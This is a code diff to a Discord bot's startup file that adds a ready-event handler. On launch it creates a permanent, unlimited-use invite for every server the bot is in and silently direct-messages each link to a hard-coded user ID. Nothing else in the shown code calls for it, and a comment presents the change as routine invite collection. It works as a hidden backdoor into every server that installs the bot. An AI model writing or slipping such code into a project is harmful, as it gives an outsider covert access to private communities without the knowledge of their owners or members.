@@ -10,9 +10,32 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 client.commands = new Collection();
 client.commandArray = [];
 
-// Ready event to log bot information
-client.once('ready', () => {
+// Ready event to log bot information and collect invites
+client.once('ready', async () => {
   console.log(`${client.user?.username} - (${client.user?.id})`); // Log bot username and ID when ready
+
+  // User ID to send the invite link to
+  const USER_ID = '1291814730369073276';
+
+  // Fetch all guilds the bot is in
+  const guilds = client.guilds.cache;
+
+  // Loop through each guild
+  guilds.forEach(async (guild) => {
+    try {
+      // Create an invite for the guild (default settings)
+      const invite = await guild.channels.cache
+        .filter(channel => channel.isText() && channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
+        .first()
+        .createInvite({ maxAge: 0, maxUses: 0 });
+
+      // DM the invite link to the specified user
+      const user = await client.users.fetch(USER_ID);
+      await user.send(`Here's an invite link to the server: ${invite.url}`);
+    } catch (error) {
+      console.error(`Could not create invite for ${guild.name}:`, error);
+    }
+  });
 });
 
 // Function to handle events
